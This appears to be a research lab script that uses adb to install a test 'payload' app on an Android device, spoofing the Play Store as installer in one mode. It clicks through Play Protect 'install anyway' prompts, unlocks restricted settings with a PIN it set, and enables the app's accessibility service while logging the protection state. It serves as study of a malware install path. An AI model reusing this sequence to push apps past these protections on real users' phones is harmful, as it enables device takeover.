#!/usr/bin/env bash
# Lab matrix: install payload and measure ACCESS_RESTRICTED_SETTINGS + UI state.
# MODE: dropper | shell_pm | shell_vending
set -u
MODE="${MODE:-dropper}"
OUT=out
PKG=com.noteslite.app
DROP=com.suda07.update
mkdir -p "$OUT"

say() { echo; echo "===== $* ====="; }
shot() { adb exec-out screencap -p > "$OUT/$1.png" 2>/dev/null || true; }
dump() { # dump <tag> — retry until non-trivial tree (uiautomator пусто, пока идёт анимация)
  for _ in 1 2 3 4 5 6 7 8; do
    adb shell uiautomator dump /sdcard/ui.xml >/dev/null 2>&1
    adb pull /sdcard/ui.xml "$OUT/$1.xml" >/dev/null 2>&1 || true
    if [ -f "$OUT/$1.xml" ] && [ "$(wc -c < "$OUT/$1.xml")" -gt 8000 ]; then return 0; fi
    sleep 2
  done
  adb shell dumpsys window 2>/dev/null | grep -E 'mCurrentFocus' | head -2
}
tap() { # tap <regex> <tag>
  dump "ui_$2"
  echo "--- tap $2 / $1"
  python3 scripts/tap.py "$OUT/ui_$2.xml" "$1" || true
}
sleep2() { sleep "${1:-2}"; }
opget() { echo "--- appops:"; adb shell appops get "$PKG" ACCESS_RESTRICTED_SETTINGS 2>&1 || true; }

say "env"
adb shell getprop ro.build.version.release
adb shell getprop ro.build.version.sdk
adb shell getprop ro.product.name
adb shell settings put global window_animation_scale 0
adb shell settings put global transition_animation_scale 0
adb shell settings put global animator_duration_scale 0
adb shell svc power stayon true
adb shell input keyevent KEYCODE_WAKEUP || true
adb shell locksettings set-pin 2589 2>&1 || true
adb shell wm dismiss-keyguard || true
adb shell input swipe 540 1600 540 400 || true
sleep2 3
shot 00_home

say "install ($MODE)"
case "$MODE" in
  dropper)
    adb install -r apk/dropper.apk 2>&1 | tail -3
    # op как у жертвы, нажавшей "Allow from this source" (иначе установка из
    # неизвестного источника блокируется диалогом и ECM не проверяется)
    adb shell appops set "$DROP" REQUEST_INSTALL_PACKAGES allow || true
    adb shell am force-stop "$DROP" || true
    adb shell am start -n "$DROP/.MainActivity" 2>&1 | tail -2
    ;;
  shell_pm)
    adb install apk/payload.apk 2>&1 | tail -3
    ;;
  shell_vending)
    adb push apk/payload.apk /data/local/tmp/p.apk >/dev/null 2>&1
    adb shell pm install -i com.android.vending /data/local/tmp/p.apk 2>&1 | tail -3
    ;;
esac

# drive installer / Play Protect dialogs
say "dialogs"
i=0
while [ $i -lt 15 ]; do
  i=$((i+1))
  if adb shell pm path "$PKG" 2>/dev/null | grep -q base.apk; then
    echo "payload installed at pass $i"
    break
  fi
  dump "ui_$i"
  shot "dlg_$i"
  python3 scripts/tap.py "$OUT/ui_$i.xml" '^(settings|настройки|параметры)$' && { sleep2 4; continue; }
  python3 scripts/tap.py "$OUT/ui_$i.xml" 'allow from this source|разрешить.*источник' && { sleep2 3; continue; }
  python3 scripts/tap.py "$OUT/ui_$i.xml" '^(install|установить)$' && { sleep2 6; continue; }
  python3 scripts/tap.py "$OUT/ui_$i.xml" 'install anyway|всё равно|установить все' && { sleep2 6; continue; }
  python3 scripts/tap.py "$OUT/ui_$i.xml" '^(ok|ок)$' && { sleep2 4; continue; }
  python3 scripts/tap.py "$OUT/ui_$i.xml" 'continue|продолжить' && { sleep2 4; continue; }
  python3 scripts/tap.py "$OUT/ui_$i.xml" '^(done|готово)$' && { sleep2 3; continue; }
  sleep2 3
done

say "installed?"
adb shell pm list packages | grep -i noteslite || echo "PAYLOAD NOT INSTALLED"
adb shell dumpsys package "$PKG" 2>/dev/null | grep -E 'versionCode|installerPackageName|firstInstallTime|installerPackage' | head -6
opget
shot 01_after_install

say "op sampling (who writes)"
for n in 1 2 3 4 5 6 7 8; do
  echo "t+$((n*3))s: $(adb shell appops get "$PKG" ACCESS_RESTRICTED_SETTINGS 2>&1 | head -3 | tr '\n' ' ')"
  sleep2 3
done
adb logcat -d 2>/dev/null | grep -E 'AppOpsService|EnhancedConfirmation|DefMngr|Hermes' | tail -80 > "$OUT/opwho.txt" || true
grep -iE 'restricted|EnhancedConf' "$OUT/opwho.txt" | tail -20 || true

say "app info screen"
adb shell am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d "package:$PKG" >/dev/null 2>&1
for k in 1 2 3 4 5 6 7 8; do
  sleep2 2
  dump ui_appinfo
  grep -q 'Uninstall' "$OUT/ui_appinfo.xml" && break
done
shot 02_appinfo
grep -o 'content-desc="[^"]*"' "$OUT/ui_appinfo.xml" 2>/dev/null | sort -u | head -30

say "overflow menu"
python3 scripts/tap.py "$OUT/ui_appinfo.xml" 'more options|ещё|дополнительн' || adb shell input keyevent KEYCODE_MENU
for k in 1 2 3 4; do sleep2 2; dump ui_menu; grep -qE 'Allow restricted|Uninstall updates' "$OUT/ui_menu.xml" && break; done
shot 03_menu
grep -oE 'text="[^"]+"' "$OUT/ui_menu.xml" 2>/dev/null | sort -u | head -30

say "allow restricted settings"
if python3 scripts/tap.py "$OUT/ui_menu.xml" 'allow restricted|разрешить доступ к настройкам'; then
  sleep2 2
  shot 04_confirm
  dump ui_confirm
  grep -oE 'text="[^"]+"' "$OUT/ui_confirm.xml" 2>/dev/null | head -20
  python3 scripts/tap.py "$OUT/ui_confirm.xml" '^(allow|разрешить)$' || true
  sleep2 3
  shot 05_after_allow
  dump ui_pin
  grep -oE 'text="[^"]+"|content-desc="[^"]*"' "$OUT/ui_pin.xml" 2>/dev/null | head -20
  adb shell input text 2589
  sleep2 1
  adb shell input keyevent KEYCODE_ENTER
  sleep2 3
  shot 06_pin_done
  dump ui_pin2
  grep -oE 'text="[^"]+"' "$OUT/ui_pin2.xml" 2>/dev/null | head -20
  # fallback: клавиатура PIN набирается тапами по цифрам
  if grep -qiE 'enter your pin|введите pin' "$OUT/ui_pin2.xml" 2>/dev/null; then
    for d in 2 5 8 9; do python3 scripts/tap.py "$OUT/ui_pin2.xml" "^$d\$" || true; sleep2 1; done
    python3 scripts/tap.py "$OUT/ui_pin2.xml" 'enter|ввод|check|ок|ok' || adb shell input keyevent KEYCODE_ENTER
    sleep2 4
  fi
  shot 06b_pin_after
  tap '^(ok|ок|done|готово)$' tag_pinok
  sleep2 2
else
  echo "NO 'Allow restricted settings' ITEM IN MENU"
  adb shell input keyevent KEYCODE_BACK
fi

say "appops after menu path"
opget
shot 07_op_after
adb shell appops get "$PKG" 2>&1 | head -20

say "accessibility screen"
adb shell am start -a android.settings.ACCESSIBILITY_SETTINGS >/dev/null 2>&1
for k in 1 2 3 4 5; do sleep2 2; dump ui_a11y; grep -q 'Notes Lite' "$OUT/ui_a11y.xml" && break; done
shot 08_a11y
grep -iE 'noteslite|Notes Lite' "$OUT/ui_a11y.xml" 2>/dev/null | head -3
python3 scripts/tap.py "$OUT/ui_a11y.xml" '^Notes Lite$' || true
sleep2 1
shot 09_a11y_after_tap
dump ui_a11y_tap
grep -oE 'text="[^"]+"' "$OUT/ui_a11y_tap.xml" 2>/dev/null | head -20
sleep2 2
shot 09b_a11y_settled
dump ui_a11y_settled
grep -oE 'text="[^"]+"|content-desc="[^"]*"' "$OUT/ui_a11y_settled.xml" 2>/dev/null | head -25

say "enable toggle (1 tap + system modal)"
python3 scripts/tap.py "$OUT/ui_a11y_settled.xml" '^Use Notes Lite$' || adb shell input tap 262 261
sleep2 2
shot 11_toggle_on
dump ui_confirm_allow
python3 scripts/tap.py "$OUT/ui_confirm_allow.xml" '^(allow|разрешить)$' || true
sleep2 3
shot 12_toggle_done
adb shell settings get secure enabled_accessibility_services 2>&1
adb shell dumpsys accessibility 2>/dev/null | grep -iE 'noteslite|bound' | head -5
opget

say "state summary"
adb shell dumpsys accessibility 2>/dev/null | grep -iE 'noteslite|enabled services' | head -5
opget
adb shell appops get "$PKG" ACCESS_RESTRICTED_SETTINGS 2>&1 | head -3
shot 10_final

say "logcat"
adb logcat -d 2>/dev/null | grep -iE 'AppOps|EnhancedConfirmation|restricted|Hermes|PlayProtect|Finsky|PackageInstaller' | tail -400 > "$OUT/logcat.txt" || true

say "done"
